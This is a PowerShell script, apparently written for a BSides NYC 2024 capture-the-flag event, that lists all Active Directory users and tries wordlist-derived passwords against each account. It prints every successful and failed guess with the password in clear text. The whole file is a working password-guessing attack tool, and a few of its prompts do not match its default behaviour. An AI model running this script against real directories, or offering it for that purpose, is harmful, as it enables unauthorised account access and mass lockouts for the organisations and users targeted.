import-module ActiveDirectory 

<#
Created specifically for the BSides NYC 2024 ProsVJoesCTF
This has not been tested in a production environment and should not be used in a production environment.
This script is designed to be used in a controlled environment for the purposes of the BSides NYC 2024 ProsVJoesCTF.
Use at your own risk. I am not responsible for any damage caused by this script and it is provided as-is.
#>



# Set the domain
$domain = "x"

# Set the list of users
$users = Get-ADUser -Filter * -SearchBase "DC=$domain,DC=$domain" | Select-Object -ExpandProperty SamAccountName

# or use a list of users from a file
# $users = Get-Content users.txt


# Define parameters for the passwords - first identifying number of words to combine, if capital letters will be used, if numbers are used, and if symbols are used.
# The default will be 2 words, separated by one symbol, with a number at the end of either word or both.
# Prompt the user to choose amount of words to combine
$wordCount = Read-Host "How many words would you like to combine? (Default is 2)"
if ($wordCount -eq "") {
    $wordCount = 2
}
# Prompt to choose if capital letters are used
$capital = Read-Host "Use capital letters? (Y [default]/n)"
if ($capital -eq "Y") {
    $capital = $true
}
else {
    $capital = $false
}
# Prompt to choose if numbers are used
$numbers = Read-Host "Use numbers? (Y [default]/n)"
if ($numbers -eq "Y") {
    $numbers = $true
}
else {
    $numbers = $false
}
# Prompt to choose if symbols are used
$symbols = Read-Host "Use symbols? (Y [default]/n)"
if ($symbols -eq "Y") {
    $symbols = $true
}
else {
    $symbols = $false
}

# Define which wordlist to use, default to dictionary.txt
$wordlist = Read-Host "Which wordlist would you like to use? (Default is dictionary.txt)"
if ($wordlist -eq "") {
    $wordlist = "dictionary.txt"
}

# Optionally use another wordlist and combine with the default/first wordlist
$wordlist2 = Read-Host "Would you like to use another wordlist? (y/N [default])"
if ($wordlist2 -eq "y") {
    $twowordlists = $true
    $wordlist2 = Read-Host "Which wordlist would you like to use?"
}


# if twowordlists, combine every word in the first list with every word in the second list. Follow the parameters chosen for capital letters, numbers, and symbols. Write all new passwords to a temporary_passwords.txt
$words = Get-Content $wordlist
if ($twowordlists) {
    $words2 = Get-Content $wordlist2
    $passwords = foreach ($word in $words) {
        foreach ($word2 in $words2) {
            $password = $word + $word2
            if ($capital) {
                $password = $password.Substring(0, 1).ToUpper() + $password.Substring(1)
            }
            if ($numbers) {
                $password += (Get-Random -Minimum 0 -Maximum 9)
            }
            if ($symbols) {
                $password += (Get-Random -InputObject "!@#$%^&*()_+-=")
            }
            $password
        }
    }
}
else {
    $passwords = $words
    $passwords = foreach ($word in $words) {
        $password = $word
        if ($capital) {
            $password = $password.Substring(0, 1).ToUpper() + $password.Substring(1)
        }
        if ($numbers) {
            $password += (Get-Random -Minimum 0 -Maximum 9)
        }
        if ($symbols) {
            $password += (Get-Random -InputObject "!@#$%^&*()_+-=")
        }
        $password
    }
}

# Write the passwords to a temporary file
$passwords | Out-File -FilePath temporary_passwords.txt

# Loop through each user and password
foreach ($user in $users) {
    foreach ($password in $passwords) {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($user, $securePassword)
        
        try {
            $null = Get-ADUser -Identity $user -Credential $credential -ErrorAction Stop
            Write-Output "Success: $user with password $password"
        }
        catch {
            Write-Output "Failed: $user with password $password"
        }
    }
}

# Prompt to remove the temporary file, and if so, remove the temporary file
$remove = Read-Host "Would you like to remove the temporary file? (Y/n [default])"
if ($remove -eq "Y") {
    Remove-Item temporary_passwords.txt
}

